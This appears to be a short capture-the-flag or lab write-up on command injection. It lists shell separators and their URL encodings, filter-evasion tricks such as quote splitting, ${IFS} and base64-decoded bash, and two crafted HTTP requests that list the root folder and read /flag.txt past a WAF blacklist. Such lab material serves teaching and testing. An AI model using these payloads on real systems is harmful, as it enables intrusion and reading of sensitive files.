____

```bash
;
%3b
\n
%0a
&
%26
|
%7c
&&
%26%26
||
%7c%7c
``
%60%60
$()
%24%28%29
```

```bash
uname
u'n'a'm'e
${uname}
$(uname)
{uname}
$(rev<<<'emanu')
bash<<<$(base64 -d<<<dW5hbWUgLWE=)
b'a's'h'<<<$('b'a's'e'6'4 -d<<<dW5hbWUgLWE=)
l's'${IFS}${PATH:0:1}${IFS}-a'l'
```

> Modifying the request in repeat with a Payload to list the root `/` folder and list all hidden files with the command, `&$()ls / -al`. The obfuscated payload below:

```
GET /index.php?to=tmp%26$()l's'${IFS}${PATH:0:1}${IFS}-a'l'&from=2561732172.txt&finish=1&move=1 HTTP/1.1
```

> Bash command to read the flag contents, `&$()cat /flag.txt`.  
> Below is the obfuscated command injection payload to bypass blacklisted commands and characters through WAF filters.

```
GET /index.php?to=tmp%26$()c'a't${IFS}${PATH:0:1}flag.txt&from=2561732172.txt&finish=1&move=1 HTTP/1.1
```

